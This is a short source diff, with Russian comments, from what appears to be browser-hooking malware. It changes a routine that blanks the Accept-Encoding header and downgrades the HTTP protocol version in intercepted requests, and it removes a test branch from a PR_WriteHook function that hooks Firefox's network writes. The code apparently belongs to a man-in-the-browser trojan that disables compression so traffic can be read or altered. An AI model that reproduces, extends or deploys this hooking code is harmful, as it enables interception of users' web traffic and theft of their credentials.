@@ -380,19 +380,23 @@ bool SubstituteHeader(PCHAR Buffer, PRInt32  &BufferSize)
 	// Функция подменяет некоторые заголовки запроса
 
 	// Отключаем сжатие данных
-	const static char gzip_deflate[] = {'g','z','i','p',',','d','e','f','l','a','t','e',0};
 
-	int Pos = STR::Pos(Buffer, (PCHAR)gzip_deflate, BufferSize);
-
+	int Pos = STR::Pos(Buffer, ParamAcceptEncoding, BufferSize, false);
 	if (Pos >= 0)
 	{
-		PCHAR Tmp = Buffer + Pos;
-		while (*Tmp != 10 && *Tmp != 13 && (Tmp - Buffer < BufferSize))
+		PCHAR S = Buffer + Pos + STRA::Length(ParamAcceptEncoding);
+		S = STRA::Scan(S, ':');
+		if (S)
 		{
-			*Tmp = ' ';
-			Tmp++;
+			S++;
+			while (*S != 10 && *S != 13 && (S - Buffer < BufferSize))
+			{
+				*S = ' ';
+				S++;
+			}
 		}
 	}
+
 
     // Меняем версию протокола
 	Pos = STR::Pos(Buffer, HTTPProtocolVersion_1_1, BufferSize);
@@ -767,12 +771,6 @@ PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 	// Для теста 
 
 	PCHAR PBuf = (PCHAR)buf;
-	if (STR::Pos(PBuf, "script6") >= 0)
-
-	{
-		DWORD FT = fd->methods->file_type;
-		buf = buf;
-	} 
 
 	PRequest Request = Request::Find(FFRequests, fd);
 	if ( Request != NULL )
